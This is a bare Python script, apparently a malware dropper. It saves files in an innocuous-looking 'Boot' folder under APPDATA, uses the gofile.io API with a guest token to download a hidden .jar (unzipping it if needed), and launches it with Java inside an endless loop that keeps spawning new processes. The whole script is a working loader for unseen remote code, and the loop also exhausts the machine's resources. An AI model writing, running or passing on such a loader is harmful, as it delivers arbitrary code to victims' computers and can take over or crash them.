import subprocess
import os
import requests
import zipfile

appdata = os.getenv("APPDATA")
app_folder = os.path.join(appdata, "Boot")
jar_path = os.path.join(app_folder, "mod.jar")
zip_path = os.path.join(app_folder, "temp.zip")

def download_jar():
    content_id = "JAzhZsxS"
    token_res = requests.post("https://api.gofile.io/accounts/guest").json()
    token = token_res["data"]["token"]
    info = requests.get(
        f"https://api.gofile.io/contents/{content_id}",
        headers={"Authorization": f"Bearer {token}"}
    ).json()
    files = info["data"]["children"]
    file_data = next(iter(files.values()))
    direct_url = file_data["link"]
    response = requests.get(direct_url, headers={
        "Authorization": f"Bearer {token}",
        "Cookie": f"accountToken={token}"
    })
    content = response.content
    if direct_url.endswith(".zip"):
        with open(zip_path, "wb") as f:
            f.write(content)
        with zipfile.ZipFile(zip_path, "r") as z:
            jar_files = [f for f in z.namelist() if f.endswith(".jar")]
            if not jar_files:
                exit(1)
            z.extract(jar_files[0], app_folder)
            extracted = os.path.join(app_folder, jar_files[0])
            os.rename(extracted, jar_path)
        os.remove(zip_path)
    else:
        with open(jar_path, "wb") as f:
            f.write(content)

if not os.path.exists(app_folder):
    os.makedirs(app_folder)
if not os.path.exists(jar_path):
    download_jar()

while True:
    subprocess.Popen(["java", "-jar", jar_path], cwd=app_folder)